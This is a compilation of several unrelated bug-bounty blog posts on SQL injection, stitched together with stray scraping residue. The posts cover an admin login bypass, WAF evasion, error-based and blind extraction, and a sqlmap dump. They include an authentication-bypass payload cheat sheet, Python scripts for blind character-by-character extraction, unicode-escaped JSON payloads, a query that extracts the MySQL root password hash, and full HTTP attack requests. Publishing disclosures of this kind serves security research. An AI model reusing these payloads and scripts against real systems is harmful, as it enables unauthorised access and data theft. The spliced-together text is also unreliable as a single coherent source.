What happened was i was working on AutoTraders Bug Bounty Program and had reported a couple of issues but all were Duplicate so i was checking subdomains when i landed on a subdomain that was https://dealeremail.autotrader.co.uk/ and this subdomain had a Login page So i Tried Multiple login using different Usernames and Passwords But none of them worked so Following the testing for SQLi I entered a 1” in Username Field and an Error Occurred that was something like SELECT * FROM adm WHERE the Error was Long and had the SQL Query that the login page function was using So Next Phase i used the Most Common Injection String in Username and Password fields and BOOM 💥 I was into the Admin Panel The String I used was admin’–‘ for Username and same admin’–‘ For The Password That’s All for this Short POC 🙂 But I’m adding some common Strings that can be useful for you guys while testing for such issues SQLi Auth Bypass Common Cheatsheet or 1=1 or 1=1– or 1=1# or 1=1/* admin” or “1”=”1″– admin” or “1”=”1″# admin” or “1”=”1″/* admin”or 1=1 or “”=” admin” or 1=1 admin” or 1=1– admin” or 1=1# admin” or 1=1/* admin”) or (“1″=”1 admin”) or (“1″=”1”– admin”) or (“1″=”1″# admin”) or (“1″=”1″/* admin”) or “1”=”1 admin”) or “1”=”1″– admin”) or “1”=”1″# admin”) or “1”=”1″/* admin’ — admin’ # admin’/* admin’ or ‘1’=’1 admin’ or ‘1’=’1′– admin’ or ‘1’=’1’# admin’ or ‘1’=’1’/* admin’or 1=1 or ”=’ admin’ or 1=1 admin’ or 1=1– admin’ or 1=1# admin’ or 1=1/* admin’) or (‘1’=’1 admin’) or (‘1’=’1’– admin’) or (‘1’=’1’# admin’) or (‘1’=’1’/* admin’) or ‘1’=’1 admin’) or ‘1’=’1′– admin’) or ‘1’=’1’# admin’) or ‘1’=’1’/* So the End I reported the issue it was migrated urgently and all i got was This Swag Pack ( It was indeed Useful ) Thanks for Reading guys! 🙂 Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Click to share on LinkedIn (Opens in new window) LinkedIn Click to share on Reddit (Opens in new window) Reddit Click to share on Tumblr (Opens in new window) Tumblr Click to share on Telegram (Opens in new window) Telegram Click to share on WhatsApp (Opens in new window) WhatsApp Click to email a link to a friend (Opens in new window) Email Like this: Like Loading...

Here’s the full content:\n\nSQL Injection and A silly WAF Skip to main content Search This Blog Mahmoud Gamal - Security Blogs SQL Injection and A silly WAF Get link Facebook X Pinterest Email Other Apps July 25, 2018 Hi Folks, Today I'll be writing about some interesting SQL injection vulnerabilities I recently found. This is a private program so I won't be mentioning who the vendor is. #1: WAF? ok! At a lovely hacking night I started testing for a private bug bounty program, after about 30 minutes of throwing random single and double quotes inside all the parameters, one of the endpoints returned an error saying: {\"error\":\"An unexpected error has occured\"} So I looked at the request and set the value of the parameter to `23' and '1'='1` and as expected the endpoint returned valid results which means it's vulnerable to SQL injection! That's it, a lovely basic Boolean-Based SQL injection let's write the report and get a nice bounty! But... THE WAF! While further exploiting this vulnerability to extract data from the database as a proof of concept, the endpoint was returning {\"error\":\" undergoing corrective maintenance \"} even to normal requests without any SQLi payloads. I later realized that this is probably the WAF blocking some random requests when it suspects an IP address which explains why other researchers haven't reported this obvious SQLi before (maybe they thought it was a false-positive. I also thought that, it took me some time to understand what was going on!) So I wrote a python script that detects when the WAF blocks a request if the response contains \"undergoing corrective maintenance\" and repeats it until we get response from the server (If we get \"Error\" or \"True\" that means we are talking to the server): import requests c = {} # Cookies s = '_-@.abcdefghijklmnopqrstuvwxyz0123456789' res = '' restart = True while(restart): restart = False for i in s: if(i == '_'): i = '\\\\_' # print i p = \"23' AND (select lower(ora_database_name) from dual) like '\"+str(res)+str(i)+\"%\" # SQL Query try: r = requests.post(\"http://target/vulnerable\",data={\"serialNumber\":p}, headers=c) except requests.exceptions.Timeout as e: print \"Timed out\" while('undergoing corrective' in r.content): # Silly WAF? repeat the request print \"Repeating Request\" r = requests.post(\"http://target/vulnerable\",data={\"serialNumber\":p}, headers=c) if \"SESSION_EXPIRED\" in r.content: print \"ERROR - SESSION_EXPIRED\" break if \"true\" in r.content: ## No error, correct char res+=i print res , \"found\" restart = True break The PoC worked, I reported the vulnerability and received the bounty. I didn't stop right there, now knowing how the WAF works, I kept testing all other endpoints and found a couple more with the same technique. Ok, that probably was not that hard, let's move on to the next level. #2: Fuck you WAF! One of the endpoints (a non-json one) was also vulnerable to boolean based sql injection similar to the one above, but the WAF this time was acting differently. When my SQL query evaluated to `true` the response had a specific word, let's say `2222`, but when it evaluated to false, the application returned a static error page. The problem was that the WAF was returning the exact same response as when the query evaluated to false which means I can't differentiate between a response that was sent by the WAF and a response that was sent by the server when the query is evaluated to false as they both are exactly the same! I kept trying to bypass the WAF but no luck, it was returning the same error page for random requests even when the query evaluated to true so I wasn't able to extract anything from the database. I was about to give up when I came across an idea to write a python script that repeats any request that returns an error page (which means the query was evaluated to false) for 5 times to make sure we get response from the server not the WAF since the WAF was blocking random requests and it actually WORKED! import requests c = {} # cookies s = '_-@.abcdefghijklmnopqrstuvwxyz0123456789' res = '' restart = True x = 0 r = '' while(restart): restart = False for i in s: x = 0 if(i == '_'): i = '\\\\_' p = \"6214111' and (SELECT lower(user) from dual) like '\"+str(res)+str(i)+\"%,2222\" # SQL Query try: r = requests.post(\"https://target/vulnerable2/\",data={\"Nbr\":p}, headers=c) except requests.exceptions.Timeout as e: print \"Timed out\" if \"2222\" not in r.content: while(\"2222\" not in r.content and x < 5): ## repeat 5 times to make sure we are talking to the server :) r = requests.post(\"https://target/vulnerable2/\",data={\"Nbr\":p}, headers=c) x += 1 else: res+=str(i) print res , \"found\" restart = True break if \"2222\" in r.content: res+=str(i) print res , \"found\" restart = True break Again, bug hunted, silly WAF beaten, report sent and bounty granted! I wanted to write about another interesting SQL injection on the same program but since it's a little bit different and has nothing to do with the WAF, I will keep it for the next post.

Post a Comment Popular posts from this blog Handlebars template injection and RCE in a Shopify app April 04, 2019 TL;DR We found a zero-day within a JavaScript template library called handlebars and used it to get Remote Code Execution in the Shopify Return Magic app. The Story: In October 2018, Shopify organized the HackerOne event \"H1-514\" to which some specific researchers were invited and I was one of them. Some of the Shopify apps that were in scope included an application called \"Return Magic\" that would automate the whole return process when a customer wants to return a product that they already purchased through a Shopify store. Looking at the application, I found that it has a feature called Email WorkFlow where shop owners can customize the email message sent to users once they return a product. Users could use variables in their template such as {{order.number}} , {{email}} ..etc. I decided to test this feature for Server Side Template injection and entered {{this}} {{self}} then sent a test email to myself and the email had [object Object] within ... Read more SQL Injection: Utilizing XML Functions in Oracle and PostgreSQL to bypass WAFs February 13, 2023 TL;DR. In this blog post we will be discussing how built-in XML functions in Oracle and PostgreSQL database management systems can be used to bypass web application firewalls (WAFs). I will be presenting two real-life examples from private bug bounty programs where traditional methods for bypassing WAFs were not effective. Introduction It's really frustrating when you find a valid SQL injection vulnerability, but there isn't much to do because of a WAF blocking most of your payloads. Many WAF rules can be bypassed using character case switching, comments, splitting the payload into multiple parameters, double URL encoding and many other methods that depend on how the target application and the WAF handle your requests. However, In the cases we are discussing in this blog, I was not able to bypass the WAF using common WAF bypass methods. Case 1: SQL Injection in an Oracle database - WAF bypass using REGEXP_LIKE() and DBMS_XMLGEN.GETXMLTYPE() *This is a private bug bounty prog... Read more Exploiting Out Of Band XXE using internal network and php wrappers August 06, 2019 Hello hackers, A couple of weeks ago I tweeted about exploiting an out of band XXE vulnerability with a firewall blocking all outgoing requests including DNS lookups, so here is the full story: This is a private bug bounty program so I won't be mentioning who the vendor is. As usual during a hacking night while navigating the target application I came across an endpoint that took a parameter called xml but its value was encrypted. Later I found out that XML data sent to the backend is encrypted in the client side before sent in HTTP requests which means that XML data might not be properly validated in the backend, so I wanted to modify it to be able to inject my own XXE payload. So what I first tried was to find the JavaScript function used to encrypt the XML and do the same for my custom XML payload, however, the application's JavaScript was minimized with WebPack which made it very hard to read and trace functions. To avoid the hassle of finding the JavaScript encrypting...

So I decided to see if any other Vulnerability exists that i can use to Login or either get some sensitive information from the site So i fired Up Burp And at first send a random Email and password and captured the request it was similar to this POST /bootcamp/login HTTP/1.1 Content-Type: application/json Content-Length: 74 Referer: https://bootcamp.nutanix.com/ Host: bootcamp.nutanix.com Connection: Keep-alive Accept-Encoding: gzip,deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21 Accept: */* {“email”:” [email protected] “,” password”:”passwordlol”} The Response of this was Invalid Username and Password. So Then I started Monitoring the Reposine of the Request Using Burp repeater whenever i change something in the request first i thought of getting an SQLi in the Headers but that didn’t work but then i added a simple 1’\\ to the Email Field the Response of this Request was Different from all of them It was a 500 Internal Server Error and Same Error when we put this on Password Parameter because that was Also vulnerable . HTTP/1.1 500 Internal Server Error X-Powered-By: Express Content-Type: application/json; charset=utf-8 Content-Length: 301 ETag: W/”12d-ZLo463k+ S1SW5Z9MTAnhrr4EGvI” Date: Mon, 16 Jul 2018 18:20:13 GMT Connection: keep-alive {“code”:”ER_PARSE_ERROR”,” errno”:1064,”sqlMessage”:”You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ”\\”‘ at line 1″,”sqlState”:”42000″,”index”: 0,”sql”:”SELECT id from Users WHERE email=\\”1’\\”\\” AND password=\\”‘\\””} So This was indeed a surprise for me and was also fun to see the error after so many tries. Now the Next Part was to see if the SQLi is Exploitable any further ot not POST /bootcamp/login HTTP/1.1 Content-Type: application/json Content-Length: 74 Referer: https://bootcamp.nutanix.com/ Host: bootcamp.nutanix.com Connection: Keep-alive Accept-Encoding: gzip,deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21 Accept: */* {“email”:”a\\”and(extractvalue( 1,concat(0x0a,@@version)))#”,” password”:”‘”} and this Gave an Output as expected HTTP/1.1 500 Internal Server Error X-Powered-By: Express Content-Type: application/json; charset=utf-8 Content-Length: 227 ETag: W/”e3- FF7tF7d8MmsLPb6vtq6tjDeVHHk” Date: Mon, 16 Jul 2018 18:23:09 GMT Connection: keep-alive {“code”:”ER_UNKNOWN_ERROR”,” errno”:1105,”sqlMessage”:” XPATH syntax error: ‘\\n8.0.11′”,”sqlState”:”HY000″ ,”index”:0,”sql”:”SELECT id from Users WHERE email=\\”a\\”and(extractvalue(1, concat(0x0a,@@version)))#\\” AND password=\\”‘\\””} At This Point Most of the People Report the issue but i thought i should test a bit further to show a better POC than this one so here’s another SS that i used to check it manually more At This Point I simply Put the POST request to SQLmap and the OutPut was I reported this Issue to the Security Team at [email protected] and they Quickly Patched the issue and Yayyyyeeee I was Awarded with an Awesome Swag Pack that is still In Transit xD also Special thanks to Mani Sir He Always Helps Me whenever i need help or guide related to something 👌 Thanks for Reading Guys 🙂 Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Click to share on LinkedIn (Opens in new window) LinkedIn Click to share on Reddit (Opens in new window) Reddit Click to share on Tumblr (Opens in new window) Tumblr Click to share on Telegram (Opens in new window) Telegram Click to share on WhatsApp (Opens in new window) WhatsApp Click to email a link to a friend (Opens in new window) Email Like this: Like Loading...

I want to tell you about a SQL Injection bug that I found and exploited manually. Disclaimer : for the most part, I’m going to take you down the ‘happy path’ here. There were many more dead-ends, far more frustration, and much more head scratching in the discovery and exploitation of this bug than any of this would imply. I’d hate for all of that to get in the way of a good story though, so anyway… I was looking at a JSON-RPC API on a target (a target with a bug bounty program; I’m a good boy, I am), when I spotted a telltale sign of a problem: a single quote in the parameter would throw an error: tom@bash:~▶ cat payload.json { \"jsonrpc\": \"2.0\", \"method\": \"getWidgets\", \"params\": [\" 2' \"] } tom@bash:~▶ curl -s $APIURL -d @payload .json // ERRORS! ERRORS EVERYWHERE! But with the quote wrapped in a MySQL comment, there was no error: tom@bash:~▶ cat payload.json { \"jsonrpc\": \"2.0\", \"method\": \"getWidgets\", \"params\": [\" 2/*'*/ \"] } tom@bash:~▶ curl -s $APIURL -d @payload .json // No errors; just results :) (I’m redacting the method name here to avoid disclosing the name of the target). After a little messing around trying to inject a UNION (and failing), and trying a few different characters, I eventually figured out my payload was probably being put inside an IN (...) clause. Strong evidence for that was that if I passed in just a 2 , each of the assets in the returned data structure had a type_id of 2 : tom@bash:~▶ cat payload.json { \"jsonrpc\": \"2.0\", \"method\": \"getWidgets\", \"params\": [\" 2 \"] } tom@bash:~▶ curl -s $APIURL -d @payload .json | gron | grep type_id json.result.data.widget[5].assets[0]. type_id = 2 ; json.result.data.widget[5].assets[1]. type_id = 2 ; json.result.data.widget[5].assets[2]. type_id = 2 ; But if I passed in a comma-separated list of numbers, each of the assets had values for type_id that were included in the list I provided: tom@bash:~▶ cat payload.json { \"jsonrpc\": \"2.0\", \"method\": \"getWidgets\", \"params\": [\" 1,2,3,4,5,6,7,8,9,10 \"] } tom@bash:~▶ curl -s $APIURL -d @payload .json | gron | grep type_id json.result.data.widget[0].assets[0].type_id = 10; json.result.data.widget[0].assets[1].type_id = 8; json.result.data.widget[0].assets[2].type_id = 9; json.result.data.widget[1].assets[0].type_id = 10; json.result.data.widget[1].assets[1].type_id = 8; json.result.data.widget[1].assets[2].type_id = 9; json.result.data.widget[2].assets[0].type_id = 8; json.result.data.widget[2].assets[1].type_id = 10; json.result.data.widget[3].assets[0].type_id = 8; json.result.data.widget[3].assets[1].type_id = 9; json.result.data.widget[3].assets[2].type_id = 10; json.result.data.widget[4].assets[0].type_id = 8; json.result.data.widget[4].assets[1].type_id = 9; json.result.data.widget[4].assets[2].type_id = 10; json.result.data.widget[5].assets[0].type_id = 10; json.result.data.widget[5].assets[1].type_id = 8; json.result.data.widget[5].assets[2].type_id = 9; json.result.data.widget[5].assets[3].type_id = 2; json.result.data.widget[5].assets[4].type_id = 2; json.result.data.widget[5].assets[5].type_id = 2; That behaviour, and the relationship between widgets and assets , led me to believe that the query probably looked something like this: SELECT w.id, w.name, a.type_id FROM widgets w LEFT JOIN assets a ON ( a.widget_id = w.id AND a.type_id IN ( $IDS ) ) ...more SQL... I was pretty sure it was a LEFT JOIN because the same number of widgets were always being returned, only the number of assets attached to them would vary depending on the parameter; and I was fairly sure there was some more SQL after the JOIN (a LIMIT , ORDER BY , another JOIN , or something like that) and that’s what was preventing my earlier attempt at injecting a UNION statement from working. So, no way to directly exfiltrate data then. This SQLi is as blind as a dodo (what? Dodos are dead, and dead things can’t see). Binary Questions One of the fairly common ways to leverage a blind SQL Injection is to ask yes/no questions using an IF(expression, true, false) statement, and that was my very first thought. I knew already that if I provided an ID of 2 there would be some assets attached to the widgets , and if I provided an ID of 1 there would be no assets . So — in theory at least — I could use a subquery as my payload and have it return 2 for true and 1 for false . If there’s assets in the response the answer would be ‘yes’, and if there aren’t any the answer would be ‘no’. I decided I would test the theory by trying to figure out something simple: the hostname of the database server. The hostname on a MySQL server is stored in the hostname variable, and you can easily see it like this: mysql> SELECT @@hostname; +------------+ | @@hostname | +------------+ | girru | +------------+ 1 row in set (0.00 sec) These examples are being run on a machine of mine, named after the Babylonian god of fire. I always think it’s a good idea to test whatever you can locally instead of blindly (hah) trying to figure things out on the actual target, with no real feedback or error messages. Because I can only ask yes/no questions, to figure out the hostname I need to see if the first character is an a , if it’s a b , or c , and so on until I find the right character; then I can move on to the second character. You can do that by using the SUBSTRING() function: mysql> SELECT IF(SUBSTRING(@@hostname, 1, 1) = \" a \", 2, 1); +---------------------------------------------+ | IF(SUBSTRING(@@hostname, 1, 1) = \"a\", 2, 1) | +---------------------------------------------+ | 1 | +---------------------------------------------+ 1 row in set (0.00 sec) Remember: a 1 in the result means ‘no’, and a 2 means ‘yes’. So, nope: not an a . mysql> SELECT IF(SUBSTRING(@@hostname, 1, 1) = \" b \", 2, 1); +---------------------------------------------+ | IF(SUBSTRING(@@hostname, 1, 1) = \"b\", 2, 1) | +---------------------------------------------+ | 1 | +---------------------------------------------+ 1 row in set (0.00 sec) Not a b either… Cue the wavy time-travel lines… mysql> SELECT IF(SUBSTRING(@@hostname, 1, 1) = \" g \", 2, 1); +----------------------------------------------+ | IF (SUBSTRING(@@hostname, 1, 1) = \"g\", 2, 1) | +----------------------------------------------+ | 2 | +----------------------------------------------+ 1 row in set (0.00 sec) Ah! It’s a g ! Now we can move on to the next character. With my test query running fine locally, I could try it as a payload on the JSON-RPC API. Fingers crossed! tom@bash:~▶ cat payload.json { \"jsonrpc\": \"2.0\", \"method\": \"getWidgets\", \"params\": [ \" SELECT IF(SUBSTRING(@@hostname, 1, 1) = \\\"a\\\", 2, 1) \" ] } tom@bash:~▶ curl -s $APIURL -d @payload .json <HTML><HEAD> <TITLE> Access Denied </TITLE> </HEAD><BODY> <H1>Access Denied</H1> You don't have permission to access \" <redacted> \" on this server.<P> Reference&#32; <redacted> </BODY> </HTML> Dammit, dammit, dammit . Those pesky WAFs are always getting in my way. Thankfully, because the payload is JSON, I could easily obfuscate it to get around the WAF by using \\uXXXX escape sequences. Crisis averted: tom@bash:~▶ cat payload.json { \"jsonrpc\": \"2.0\", \"method\": \"getWidgets\", \"params\": [ \" \\u0053 ELECT \\u0049 F( \\u0053 UBSTRING(@@hostname, 1, 1) = \\\"a\\\", 2, 1)\" ] } tom@bash:~▶ curl -s $APIURL -d @payload .json | gron | grep type_id // No WAF error here; but no assets either! No WAF error, but no assets either; so if everything’s working as intended the hostname doesn’t begin with an a . Time to try the next letter! And the next one… And the next one… I worked my way through the alphabet until: tom@bash:~▶ cat payload.json { \"jsonrpc\": \"2.0\", \"method\": \"getWidgets\", \"params\": [ \"\\u0053ELECT \\u0049F(\\u0053UBSTRING(@@hostname, 1, 1) = \\\" r \\\", 2, 1)\" ] } tom@bash:~▶ curl -s $APIURL -d @payload .json | gron | grep type_id json.result.data.widget[5].assets[0].type_id = 2; json.result.data.widget[5].assets[1].type_id = 2; json.result.data.widget[5].assets[2].type_id = 2; Results! The hostname starts with an r ! It was at this point I decided that rather than try and figure out the second character in the hostname, I’d write up my findings and report them. I figured I had a pretty good POC and that they’d surely reward me for being the hacking god that — in that moment — I knew myself to be. Just in CASE In my report I said something like “ data exfiltration, whilst slow, could easily be scripted ”. Which is true , but it would still be a real pain to actually get any useful data out of the thing, wouldn’t it? Asking all of those yes/no questions would surely show up on somebody’s monitoring dashboard somewhere if you actually tried to use it for anything other than the shortest of strings. How can we make things a little faster? Maybe even a couple of orders of magnitude faster?! We need to go beyond binary questions, beyond trinary questions, and even beyond that!… OK, I made that sound a little more exciting that it really is: we can use a CASE statement. A CASE statement lets you do something like this: mysql> SELECT CASE SUBSTRING(@@hostname, 1, 1) -> WHEN \"a\" THEN 1 -> WHEN \"b\" THEN 2 -> WHEN \"c\" THEN 3 -> WHEN \"d\" THEN 4 -> WHEN \"e\" THEN 5 -> WHEN \"f\" THEN 6 -> WHEN \"g\" THEN 7 -> ... -> WHEN \"z\" THEN 26 -> END as result; +--------+ | result | +--------+ | 7 | +--------+ 1 row in set (0.00 sec) So, because the result of this query is 7 , I know the first character in @@hostname is g :) The slight problem here is that I couldn’t just neatly use the numbers 1 to 26 for each letter, because not all possible IDs had corresponding assets . I needed to find enough valid IDs to make this work. I wrote a little PHP script to save me from typing out the numbers from 1 to 100 and tried passing in 1,2,3...99,100 as the parameter. I used a little bit of command line trickery to find a list of all the unique valid IDs: tom@bash:~▶ cat genrange.php <?php $payload = [ \"jsonrpc\" => \"2.0\", \"method\" => \"getWidgets\", \"params\" => [ implode(\",\", range(1, 100)) ] ]; echo json_encode($payload); tom@bash:~▶ curl --compressed -s $APIURL -d @<(php genrange.php) | gron | grep type_id | awk '{print $NF}' | sort -nu 2; 9; 10; 11; ...snip... 37; 38; 39; 40; In total I found 31 valid IDs, which isn’t nearly enough to cover even the ASCII character set, but it’s enough to cover all the lower-case letters and even a few numbers for good measure. It’s also a lot better than only being able to answer yes/no questions. I knocked together another hacky PHP script to make generating my payload a little easier: tom@bash:~▶ cat gensql.php <?php // first argument to the script is the char to fetch $char = $argv[1]?? 1; // The payload $sql = ' SELECT CASE SUBSTRING(@@hostname, '.$char.', 1) WHEN \"a\" THEN 2 WHEN \"b\" THEN 8 WHEN \"c\" THEN 9 WHEN \"d\" THEN 10 ...snip... WHEN \"z\" THEN 35 WHEN \"0\" THEN 36 WHEN \"1\" THEN 37 WHEN \"2\" THEN 38 WHEN \"3\" THEN 39 WHEN \"4\" THEN 40 END '; $wrapper = [ \"jsonrpc\" => \"2.0\", \"method\" => \"getWidgets\", \"params\" => [$sql] ]; $payload = json_encode($wrapper); // Add some obfuscation to defeat the WAF :) echo str_replace( [\"C\", \"S\", \"T\", \"W\"], [\"\\u0043\", \"\\u0053\", \"\\u0054\", \"\\u0057\"], $payload ); (I probably could have generated all the WHEN \"x\" THEN y parts of the query with a loop but all I can say to that is: ¯\\_(ツ)_/¯) With my script in hand I could try and figure out the rest of that pesky hostname; using awk '{print $NF}' to print the last field (i.e. the type_id ), and uniq to remove the duplicates. First character: tom@bash:~▶ curl -s $APIURL -d @<(php gensql.php 1 ) | gron | grep type_id | awk '{print $NF}' | uniq 27 ; Consulting my lookup table, that’s an r ! Good, I knew that, so it looks like it’s working. More characters: tom@bash:~▶ curl -s $APIURL -d @<(php gensql.php 2 ) | gron | grep type_id | awk '{print $NF}' | uniq 11 ; tom@bash:~▶ curl -s $APIURL -d @<(php gensql.php 3 ) | gron | grep type_id | awk '{print $NF}' | uniq 10 ; tom@bash:~▶ curl -s $APIURL -d @<(php gensql.php 4 ) | gron | grep type_id | awk '{print $NF}' | uniq 2 ; 11 , 10 , and 2 ; that’s e , d , and a . Hmm, reda ? Let’s keep going… tom@bash:~▶ curl -s $APIURL -d @<(php gensql.php 5 ) | gron | grep type_id | awk '{print $NF}' | uniq 9 ; tom@bash:~▶ curl -s $APIURL -d @<(php gensql.php 6 ) | gron | grep type_id | awk '{print $NF}' | uniq 29 ; tom@bash:~▶ curl -s $APIURL -d @<(php gensql.php 7 ) | gron | grep type_id | awk '{print $NF}' | uniq 11 ; tom@bash:~▶ curl -s $APIURL -d @<(php gensql.php 8 ) | gron | grep type_id | awk '{print $NF}' | uniq 10 ; 9 , 29 , 11 , and 10 … So that’s c , t , e , and d . Oh hey: it’s redacted ;) All joking (and redaction) aside, I actually was able to read the hostname at a rate of one character per request, or — and this is a bit of a guess — about 2 bits per second. Upping The Impact? Reading the hostname out of a variable isn’t really a big deal; I get that. So what else could you get? How about this (provided the database user in question has permission to read it): SELECT CASE SUBSTRING(( SELECT u.authentication_string FROM mysql.user u WHERE u.User = \"root\" ), 1, 1) WHEN \"*\" THEN 2 WHEN \"0\" THEN 8 WHEN \"1\" THEN 9 ...snip... WHEN \"E\" THEN 22 WHEN \"F\" THEN 23 END 42 requests or so later and you’ve got yourself a hash for offline brute-forcing. Much of the time of course, having the root MySQL password is pretty much useless because most sane people don’t allow direct access to their MySQL instances. It’s a neat trick though, huh? In a ‘real’ attack my first port of call would be the information_schema , so I could learn more about the schema and what other juicy data could be extracted. And I might have done that, had I not found a non-blind SQL Injection bug in the very next method I looked at 🙄 This was a fun bug. I appreciate it’s nothing truly groundbreaking, but I don’t find SQLi bugs very often so I thought it warranted a write-up :) Security Bug Bounty Sql Hacking -- -- 8 Written by TomNomNom 1.8K followers · 1 following Explainer, talker, coder, fixer, eater, not really a sheep.

Vulnerability Explanation : PostgreSQL is a database that comes with MacOS X Lion, as a default standard database. According to wikipedia the majority of Linux distributions have the PostgreSQL in the supplied packages.So besides the regular databases (Oracle,MySQL etc.) there will be times as a penetration tester that we will need to assess and this database Network Mapping : Lets say that we have perform a port scan on a server and we have identify that is running a PostgreSQL database at port 5432 Press enter or click to view image in full size Vulnerability Identification : We will try a brute force attack in order to discover any weak credentials that will allow us then to connect to the database.We will open the metasploit framework and we will use the postgres_login scanner. Press enter or click to view image in full size Penetration Now that we have a valid username and password we can use that to connect to the database by using a psql client.The first query that we want to execute is the select usename, passwd from pg_shadow; because it will return to us the password hashes of the database from the pg_shadow table.

Thursday, April 16, 2020 Tricky Oracle SQL Injection Situation on April 16, 2020 in BugBounty , Security , SQLi , Tricks No comments Recently I learnt few new stuff when solving SQL Injection found during pentest and also bugbounty. One of the new technique that seems new to me is the one that I learnt from my master, pokleyzz. This injection was found in a recent bugbounty program and the actual path/parameter were replaced. The injection was found on the \"idNumber\" parameter of the following endpoint /foo/?theName=YAP&idNumber=248001[here] Common payloads were performed on this target and initially, I found the following payloads were working to identify TRUE / FALSE condition /foo/?theName=YAP&idNumber=248001'+AND+'1'='1 TRUE /foo/?theName=YAP&idNumber=248001'+AND+'2'='1 FALSE and also able to use pipe operator too /foo/?theName=YAP&idNumber=248'||'001 TRUE /foo/?theName=YAP&idNumber=24'||'8'||'001 TRUE /foo/?theName=YAP&idNumber=24'||'X'||'001 FALSE With these conditions, I was able to narrow down the database used by this application to Oracle , PosgreSQL , IBM DB2 or Informix . At first, I thought this can be done using the same technique that I know: See : https://blog.yappare.com/2012/04/advance-oracle-blind-sql-injection.html However, the CASE() was not working. After few attempts, I stopped to figure out on using CASE() . Next, this technique was tried: See: https://blog.yappare.com/2017/03/blind-sql-injection-in-erim-not-sure.html No joy. Dead end. After almost two days of trying, I give up doing it myself and ask helps from few friends. No luck. I tried my last option, pokleyzz. In just less than an hour, he showed me the technique that can be used. /foo/?theName=YAP&idNumber=248'||<bruteforce any known SQL functions here>||'001 As a result, I found \" rownum \" was accepted and this indicates the DBMS is Oracle . To reconfirm, the following was queried: /foo/?theName=YAP&idNumber=24800'||rownum||' The above payload result in the website displayed list of \" theName \" product that starts with \" idNumber \" 24800 Interesting! Now how we can at least extract data from this injection? Another blocker was identified. It seems the application filtered/replaced the following characters _ ( ) + . whitespaces While I found this seems another dead end, pokleyzz showed another brilliant way to extract the data using the following payload: /foo/?theName=YAP&idNumber=248'||<bruteforce all column_name here>||'001 - We found few column names which one of it was \"username\" Then final step was: /foo/?theName=YAP&idNumber=248001'and''||username||''like'<bruteforce-character>% I ran the Intruder on the above attacking point and voila, got the username 😼 As always, pokleyzz is the best master I have. 💻 Bye.

Avinash Jain (@logicbomb) 4 min read · Jun 6, 2018 -- 7 Listen Share Hi Guys, One more interesting blog , one more interesting vulnerability that I managed to found out during my bugbounty hunt and it comes in India’s popular sports website and this is about “ How I was able to exploit Host Header to find out SQL injection, bypassing rule using sqlmap tamper script and later on dump the database ” . Let’s see what was the complete scenario — While checking the application for bruteforce OTP vulnerability , I run the burp intruder on the site and found that my IP got blocked and I could see the error message thrown from which I could figure out that application was over AWS. Further I found that “X-Amz-Cf-Id” header set in HTTP response (which CloudFront adds to the viewer request before forwarding the request to the origin) - Press enter or click to view image in full size Cloudfront header and this was enough for me to decide that application is running over AWS. Now before directly jumping to check for some critical vulnerability, I always start from low hanging fruits (just to increase the list of vulnerabilities :) ) so I started with Host header attack , changed the host header value but it didn’t work. As I knew that application is over AWS so they must using ELB (elastic load balancer) so I tried the host header attack using X-Forwarded-Host header as below — Press enter or click to view image in full size Added X-Forwarded-host header Added X-Forwarded-Host header , set it to value to www.google.com and I got 302 redirection to google.com but when I set the value to www.evil.com , I got the below response- Press enter or click to view image in full size HTTP 403 Forbidden HTTP Forbidden with status code 403 and now something striked my mind. As it was clear that the application backend server must be having some whitelisting of host values (as it has allowed google.com but denied evil.com), now there are two possibilities either some script is checking it against array/list of allowed values or if they are storing the values in the database then there may be a Database lookup. So just to check the same , I tried some sql queries against the value of X-Forwarded-Host and this is what I got — Time based SQL Injection in X-Forwarded-Host header As you can see in the above screenshot, I gave a sql query with the sleep() of 10sec and time it took for HTTP response is 9.4sec. and yes , an unusual case of SQL injection in X-Forwarded-Host header :) and then the next task was to extract some DB content and as most usually I ran sqlmap over the vulnerable parameter and found that connection was getting refused , I decided to add the time delay to throttle HTTP requests and increase the connection timeout (--delay=DELAY --timeout=TIMEOUT and waited for some time but still I faced the same issue , might be some blacklisting of characters. To quickly check this , I entered “<script>alert(1)</script>” in the X-Forwarded-Host header and got the response with HTTP STATUS 400 — BAD REQUEST ERROR The thing was pretty much clear, script tags, <,> character was blacklisted . SQLMAP provide tamper script — between.py to replace symbols (<,>) with “NOT BETWEEN”. So I included it in the sqlmap query , ran it and after some time I ended with the complete database of the enterprise containing sample level user credentials , email-ids and lots of more data — (For Proof of Concept) Press enter or click to view image in full size Database Data and this is how I was able to found an unusual case of SQL injection by bypassing Host header attack using X-Forwarded-Host in India’s Popular Sports company.

Having this SQLi vulnerability in the application, an attacker may cause severe damage such as bypassing logins, retrieving sensitive information, modifying, deleting data. Sometimes this costs life when it comes to Healthcare, Banking domains. Okay introduction apart, the objective of this article is to exploit and read some sensitive data from the database. If you don’t know what exactly is this SQLi then read my other article which may throw some light. I am splitting the subject into two parts, having everything in one might throw you out of interest. Identifying the vulnerable site! I tried the most basic check for SQL vulnerability by inserting an apostrophe (‘) in the username field and leaving the password field empty and trying to login, after a few attempts this website gave me an SQL error which looked something like this.

